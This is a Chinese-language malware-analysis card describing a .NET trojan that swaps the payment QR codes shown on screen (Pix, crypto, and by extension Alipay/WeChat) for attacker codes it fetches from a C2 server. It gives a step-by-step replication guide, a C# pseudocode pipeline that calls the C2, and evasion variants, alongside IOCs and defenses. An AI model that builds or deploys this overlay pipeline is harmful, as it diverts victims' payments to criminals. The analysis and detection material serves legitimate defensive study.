---
id: code-analysis-reverse-windows-payment-qr-realtime-substitution-magnifier
title: 支付二维码实时替换木马：Magnify 截屏 + ZXing 解码 + QRCoder 重生成 + MoveWindow 覆盖
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: payment-qr-realtime-substitution
tags:
- malware-analysis
- dotnet
- qrcode
- zxing
- qrcoder
- screen-capture
- magnifier
- payment-fraud
- c2
- windows
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V165
  verified_at: '2026-11-06T10:02:16+08:00'
  notes: 已对照 content.md 与 19 张图核对：amem.exe/QRCoder.dll/zxing.dll 及 MD5、%TEMP%/controle_requisicao_fila.inf 上线标记、Action_flqkduqs 截屏矩形与 100ms 循环、ZXing BarcodeReader.Decode、PIX/ETH/BTC 正则与货币枚举、get-key C2、QRCoder CreateQrCode(Ecc.Q)/GetGraphic(20)、MoveWindow 覆盖、支付宝/微信二维码验证均一致。PoC 为结构化伪代码，未运行样本/未连真实 C2；Magnification API 底层调用原文未展开。frontmatter 无 sources/source_url。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-payment-qr-realtime-substitution-magnifier/
draft: false
kb_aliases:
- 二维码篡改木马
- 支付二维码替换
- Pix QR 替换
- Magnification API 截屏
- QRCoder 重生成
- amem.exe
---

## 一句话结论

.NET 金融木马在受害者屏幕上循环截图，用 ZXing 解码屏幕中的二维码，识别 PIX/ETH/BTC 等支付类型后向 C2 请求攻击者收款地址，再用 QRCoder 生成新二维码，并把一个无边框窗口移动到原二维码的屏幕坐标上覆盖显示，从而把用户看到的支付二维码实时替换成攻击者的收款码。

## 原理

- **首次运行与上线**：样本先检查 `%TEMP%/controle_requisicao_fila.inf` 是否存在；不存在时通过 `WebClient.DownloadString` 请求
  `https://<C2>/api/get-req?machine-name=<主机名>&usuario_id=4` 上报主机，随后写入 `"OK"`，避免每次启动重复注册。这是常见的“标记文件去重上线”手法。
- **屏幕捕获**：样本调用 `Model_gltfpm.Action_flqkduqs(...)`，传入 `left=0, top=0, right=Screen.PrimaryScreen.Bounds.Width, bottom=...` 的矩形，循环 `Thread.Sleep(100)` 并克隆位图；原文将其识别为 Windows 放大镜（Magnification API）截屏。相比 `BitBlt`/`CopyFromScreen`，放大镜 API 可以在不直接抓屏的情况下获得屏幕内容，常被用于辅助显示/叠加类程序。
- **二维码识别**：把位图交给 `zxing.dll` 的 `BarcodeReader.Decode(bitmap)`；`Result.Text` 即二维码中的文本（例如 Pix payload、`https://qr.alipay.com/...`、`wxp://...`）。
- **支付类型识别**：对 `Result.Text` 做正则/包含判断：
  - PIX：包含 `14BR.GOV.BCB.PIX`（大小写不敏感）；
  - ETH：`0x[a-fA-F0-9]{40}`；
  - BTC legacy：`[13][a-km-zA-HJ-NP-Z1-9]{25,34}`；
  - BTC bech32：`bc1|BC1|tb1|TB1` 开头的地址；
  - 枚举还定义了 USDT_ERC20、USDT_TRC20、BNB、SOL、ADA、DOGE、LTC、XRP、BCH、LINK、XMR、HEAR、ETC、XLM、TRON 等。
- **C2 取新地址**：识别到类型后请求 `https://<C2>/api/get-key?usuario_id=4&chave_tipo=1`，响应文本就是攻击者的收款地址/Pix payload。
- **重生成二维码**：用 `QRCoder.QRCodeGenerator.CreateQrCode(payload, QRCodeGenerator.ECCLevel.Q, false, false, QRCodeGenerator.EciMode.Default, -1)` 生成 `QRCodeData`，再 `new QRCode(qrCodeData).GetGraphic(20)` 得到位图，赋给覆盖窗口的 `PictureBox.Image`。
- **覆盖原二维码**：`Func_xjfhulla(pisd, pytgv, pugj, pznvf)` 缓存窗口坐标，变化时调用 `Model_gltfpm.Action_yecwpfqi(handle, left, top, right, bottom, true)` 移动/调整覆盖窗口，使其正好盖住屏幕上的原二维码；用户看到的即攻击者二维码。
- **国内支付验证**：原文用同一套解码/重生成代码测试支付宝（`https://qr.alipay.com/...`）和微信（`wxp://...`）收款码，确认 ZXing 能识别、QRCoder 能重新生成外观一致的二维码；样本本身的类型判断未包含支付宝/微信，但核心管线可直接复用，说明“实时替换”对国内二维码同样成立。
- 根因是支付场景依赖“屏幕上显示的二维码”作为收款凭据，而没有在支付 App 内显示/核对收款方；恶意程序只要能在屏幕上覆盖像素/窗口，就能改变用户看到的收款码。

## 触发条件

- 受害者运行 Windows .NET 木马（示例 `amem.exe` + `QRCoder.dll` + `zxing.dll`），具备截屏与创建窗口的能力。
- 屏幕上出现支付二维码（Pix、支付宝、微信或其他二维码支付），且用户使用手机扫描屏幕二维码付款。
- 样本能访问 C2 获取攻击者收款地址；C2 可用/可解析。
- 覆盖窗口未被支付页面/浏览器/安全软件检测或阻止；用户未在支付 App 内核对收款方。

## 利用步骤

1. 在隔离环境分析 .NET 样本：用 dnSpy 打开 `amem.exe`，查看入口、`Func_qnwsqfm`（首次上线）、`Proc_mddgfili`（截屏）、`Action_afbywurt`（ZXing 解码）、`Proc_hveqwbqm`（类型识别）、`Func_kcjkyid`（C2 取地址）、`Method_faigxbro`（QRCoder 生成）、`Func_xjfhulla`（MoveWindow 覆盖）。
2. 确认首次运行标记 `%TEMP%/controle_requisicao_fila.inf` 与 C2 接口；在沙箱中阻断网络或使用模拟 C2，避免真实外联。
3. 复现截屏：调用 Windows Magnification API（`MagInitialize`/`MagSetWindowSource` 等）或等价的 `Graphics.CopyFromScreen`，对屏幕区域循环取图。
4. 用 ZXing.Net 解码截图中的二维码，得到 `Result.Text`；按正则识别支付类型。
5. 用 QRCoder 把攻击者地址生成新二维码位图；创建无边框、置顶窗口（WinForms `FormBorderStyle=None`、`TopMost=true`），把位图放入 `PictureBox`。
6. 用 `MoveWindow`/`SetWindowPos` 把覆盖窗口移动到原二维码的屏幕坐标，使其完全遮住原码；循环更新以跟随页面滚动/缩放。
7. 测试支付宝/微信二维码：确认 ZXing 解码与 QRCoder 重生成能保持可扫性；在授权环境中验证用户扫描后进入的是攻击者收款页面。
8. 真实攻击中还需处理窗口层级、DPI 缩放、二维码动画/刷新、被杀软检测等问题；本文样本只覆盖基础管线。

## PoC

```csharp
// 结构性伪代码：把真实 C2/截屏 API 替换为占位，展示覆盖管线
var bmp = CaptureScreen();                     // Magnification API 或 CopyFromScreen
var result = new ZXing.BarcodeReader().Decode(bmp);
if (result != null) {
    string payload = result.Text;
    string type = DetectPaymentType(payload);   // PIX/ETH/BTC/ALIPAY/WECHAT...
    if (type != "Unknown") {
        string attacker = new WebClient().DownloadString(
            $"https://<C2>/api/get-key?usuario_id=4&chave_tipo={TypeId(type)}");
        using (var gen = new QRCoder.QRCodeGenerator())
        using (var data = gen.CreateQrCode(attacker, QRCoder.QRCodeGenerator.ECCLevel.Q)) {
            var graphic = new QRCoder.QRCode(data).GetGraphic(20);
            overlayPictureBox.Image = graphic;
        }
        MoveWindow(overlayForm.Handle, qrRect.Left, qrRect.Top,
                   qrRect.Width, qrRect.Height, true);
    }
}
```

```text
类型识别正则（示例）：
PIX   : payload.IndexOf("14BR.GOV.BCB.PIX", OrdinalIgnoreCase) >= 0
ETH   : ^0x[a-fA-F0-9]{40}$
BTC   : ^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$
BECH32: ^(bc1|BC1|tb1|TB1)[...]{6,87}$
```

## 变体与关联

- 变体：截屏可换成 `Graphics.CopyFromScreen`、Desktop Duplication API、`PrintWindow` 或 Magnification API；覆盖窗口可用 WinForms/WPF/分层窗口（`WS_EX_LAYERED`）。
- 变体：二维码定位可结合屏幕 OCR、模板匹配、UI Automation 或固定坐标；示例用窗口矩形缓存 + MoveWindow。
- 变体：目标可扩展到支付宝 `https://qr.alipay.com/...`、微信 `wxp://...`、银行/电商收款码；只需补类型识别与 payload 转换。
- 变体：为规避检测，可把 QR 库反射加载/混淆、把覆盖窗口设为透明点击穿透、在截屏时排除自身窗口。
- 关联卡片：[[mobile-android-spynote-fake-police-accessibility-credential-theft]]（移动端覆盖/无障碍窃取）、[[code-analysis-reverse-windows-doubao-imposter-configmanager-uac-amsi-driver]]（.NET 木马投放链）、[[pentest-c2-trusted-system-process-file-drop-c2-proxy]]（C2 代理/文件释放）。
- 边界：如果支付 App 在确认页显示收款方名称/金额并要求用户核对，单纯替换屏幕二维码可能被用户发现；如果覆盖窗口被安全软件拦截或支付页面使用硬件保护/独占全屏，效果受限。

## 检测与防御

- 样本 IOC：`amem.exe`（MD5 `B75AA76E1F86A0A7AAB64358ED375942`）、`QRCoder.dll`（`4885A17363679AAB6211D5960BB2BF72`）、`zxing.dll`（`E6C9AA4532FCAB70D0B57E801EA2DB18`）；C2 域名 `gsnacional.com`，接口 `/api/get-req`、`/api/get-key`；`%TEMP%/controle_requisicao_fila.inf` 标记文件。
- 行为检测：.NET 进程调用 Magnification API/截屏 API、加载 ZXing/QRCoder、创建置顶无边框窗口并调用 `MoveWindow`/`SetWindowPos` 覆盖其他窗口；向 `%TEMP%` 写固定标记；访问未知 HTTPS 域名。
- 用户侧：付款前在支付 App 内核对收款方名称、金额与订单信息；不要直接扫描屏幕上弹出的收款码；发现二维码被覆盖/闪烁时停止支付。
- 加固：应用白名单/签名校验、阻止未知 .NET DLL 侧加载；EDR 监控截屏与窗口覆盖行为；支付平台在确认页展示收款方并在服务端校验订单；对高价值交易要求二次确认。
- 分析安全：样本与 C2 均视为不可信；在隔离虚拟机、断网/模拟 C2 环境中分析，不要运行真实样本连接真实 C2。
